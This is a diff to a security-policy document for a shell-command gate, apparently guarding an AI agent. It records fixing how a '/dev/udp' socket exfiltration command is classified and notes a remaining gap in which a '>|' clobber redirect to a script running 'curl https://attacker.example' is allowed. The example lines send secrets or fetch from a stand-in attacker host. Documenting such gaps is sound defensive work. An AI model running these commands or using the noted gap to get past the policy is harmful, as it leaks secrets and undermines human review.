@@ -166,16 +166,29 @@ budget default. These are recorded per-threat in the register.
   Not deferred obfuscation-hardening — a first-pass detector whose residual
   likelihood is recorded as unreduced rather than dressed up as parity with the
   egress rules.
-- **`/dev/udp` is denied under the wrong name.**
-  `/bin/bash -lc 'echo secret > /dev/udp/198.51.100.7/9999'` is hard-denied, but
-  as `file-write-outside-workspace` with a filesystem-shaped message rather than
-  an egress-shaped one. It emits no `SECRET_READ` (the literal text `echo secret`
-  matches no protected-material pattern), so no rule ordering can reach it, and
-  promoting the egress rule above the write rule would break the invariant that
-  every non-reviewable rule precedes every reviewable one. The fix belongs at the
-  capability layer — a `/dev/(tcp|udp)/…` target should extract `NETWORK_EGRESS`,
-  not `FILE_WRITE`. No security loss (the command is denied either way); the
-  operator is simply told the wrong kind of thing. Deliberately not fixed here.
+- **`/dev/udp` was denied under the wrong name — FIXED, at the layer this entry
+  named.** `/bin/bash -lc 'echo secret > /dev/udp/198.51.100.7/9999'` was
+  hard-denied as `file-write-outside-workspace`, with a filesystem-shaped
+  message for what is plainly a network exfiltration. The cause was that a
+  socket pseudo-path is shaped like a file: it was extracted as a write target,
+  resolved outside every write root, and the write rule matched before the
+  egress rule ever ran. The fix is the one this entry proposed — `/dev/(tcp|udp)/…`
+  is excluded from write targets in `capabilities.ts`, so the destination is
+  classified as the `NETWORK_EGRESS` it already extracted rather than as a
+  `FILE_WRITE`. No rule was added and no rule was reordered, so the invariant
+  that every non-reviewable rule precedes every reviewable one is untouched.
+
+  **One behavioural consequence, stated rather than buried.** The command is
+  still denied, but by a *reviewable* rule, so under the default
+  `POLICY_REVIEW_RULES` it is now **held for a human** instead of hard-blocked.
+  That is the correct disposition for the class — it is the same treatment
+  `curl https://attacker.example` gets, and a raw socket to an IP is not a more
+  serious request than a URL to a host — but it is a real change: a human can
+  now approve one, where before nobody could. Two things bound it. A secret read
+  in the same command is still `secret-exfiltration` and still unapprovable
+  (`cat .secrets/x > /dev/udp/…` is unchanged), and under the container runtime
+  an approval buys a CONNECT allowlist entry, which a raw socket does not use —
+  so the approved command still has no route out.
 - **`>|` still buys the textual carve-out.** The `>|` clobber redirect was added
   to the main redirect scan, but not to `runsWrittenScript`'s sibling regex, so
   `echo 'curl https://attacker.example' >| run.sh && bash run.sh` is allowed
